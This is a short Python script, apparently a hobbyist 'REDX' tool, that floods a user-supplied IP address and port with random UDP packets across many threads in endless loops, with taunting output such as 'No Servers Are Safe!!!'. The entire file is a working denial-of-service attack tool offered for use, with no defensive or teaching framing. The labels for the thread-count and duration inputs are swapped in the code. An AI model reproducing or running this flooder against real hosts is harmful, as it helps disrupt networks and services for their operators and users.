import random
import socket
import threading
import os,sys
import time

os.system("clear")
time.sleep(2)
print('''\033[1;31;40m
██████╗░███████╗██████ ╗██╗░░██╗
██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
██████╔╝█████╗░░██║░░██║░╚███╔╝
██╔══██╗██╔══╝░░██║░░██║░██╔██╗
██║░░██║███████╗██████╔╝██╔╝╚██╗
╚═╝░░╚═╝╚══════╝╚═════╝╚═╝░░╚═╝
''')
print("\033[94m")
print("••••••••••••••••••••••••")
print("Don't Be Afraid To Do The Impossible!!! ")
print("Just a Little Programmer")
print("••••••••••••••••••••••••")
ip = str(input("IP TARGET:"))
port = int(input("PORT TARGET:"))
choice = str(input("GAS ATTACK(y/n):"))
times = int(input("THREAD:"))
threads = int(input(" TIME :"))

os.system("clear")
def run():
        data = random._urandom(818)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(i +" Who am I")
                except:
                        print("[X] No Servers Are Safe!!!")

def run2():
        data = random._urandom(1024)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +" Who am I")
                except:
                        s.close()
                        print("[X] No Servers Are Safe!!!")

def run3():
        data = random._urandom(818)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"Who am I")
                except:
                        s.close()
                        print("[X] No Servers Are Safe!!!")

for y in range(threads):
        if choice == 'y':
                th = threading.Thread(target = run)
                th.start()
                th = threading.Thread(target = run2)
                th.start()
        else:
                th = threading.Thread(target = run3)
                th.start()
